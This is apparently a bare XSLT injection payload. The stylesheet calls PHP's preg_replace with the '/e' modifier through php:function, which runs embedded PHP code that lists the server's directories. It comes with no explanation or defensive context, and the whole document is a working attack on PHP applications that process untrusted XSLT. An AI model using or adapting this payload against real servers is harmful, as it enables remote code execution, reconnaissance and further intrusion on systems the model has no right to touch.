<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
           <xsl:template match="/">
                   <xsl:variable name="eval">
$path = '.';

$dirs = array();

// directory handle
$dir = dir($path);

while (false !== ($entry = $dir->read())) {
       if (is_dir($path . '/' .$entry)) {
            $dirs[] = $entry; 
       }
}

echo "<pre>"; print_r($dirs);

                   </xsl:variable>
                   <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
           </xsl:template>
   </xsl:stylesheet>
